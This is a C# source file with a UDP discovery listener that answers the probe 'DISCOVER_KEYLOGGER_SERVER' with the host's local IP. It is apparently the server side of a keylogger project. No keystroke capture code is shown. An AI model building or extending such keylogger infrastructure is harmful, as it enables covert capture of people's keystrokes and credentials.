using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace ServerCore
{
    public class DiscoveryListener
    {
        public async Task StartAsync(int udpPort = 6000)
        {
            var udpListener = new UdpClient(udpPort);
            IPEndPoint remoteEP = new IPEndPoint(IPAddress.Any, 0);

            try
            {
                while (true)
                {
                    var received = await udpListener.ReceiveAsync();
                    string message = Encoding.UTF8.GetString(received.Buffer);

                    if (message == "DISCOVER_KEYLOGGER_SERVER")
                    {
                        string response = "KEYLOGGER_SERVER_RESPONSE:" + GetLocalIPAddress();
                        byte[] responseData = Encoding.UTF8.GetBytes(response);
                        await udpListener.SendAsync(responseData, responseData.Length, received.RemoteEndPoint);
                    }
                }
            }
            catch (ObjectDisposedException)
            {
                // Listener was closed, exit gracefully
            }
            catch (Exception ex)
            {
                Console.WriteLine("Discovery listener error: " + ex.Message);
            }
            finally
            {
                udpListener.Dispose();
            }
        }

        private string GetLocalIPAddress()
        {
            foreach (var networkInterface in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces())
            {
                if (networkInterface.OperationalStatus == System.Net.NetworkInformation.OperationalStatus.Up &&
                    networkInterface.NetworkInterfaceType != System.Net.NetworkInformation.NetworkInterfaceType.Loopback)
                {
                    var properties = networkInterface.GetIPProperties();

                    foreach (var addr in properties.UnicastAddresses)
                    {
                        if (addr.Address.AddressFamily == AddressFamily.InterNetwork &&
                            !IPAddress.IsLoopback(addr.Address) &&
                            !addr.Address.ToString().StartsWith("169.254"))
                        {
                            return addr.Address.ToString();
                        }
                    }
                }
            }

            throw new Exception("No suitable local IPv4 address found.");
        }

    }

}
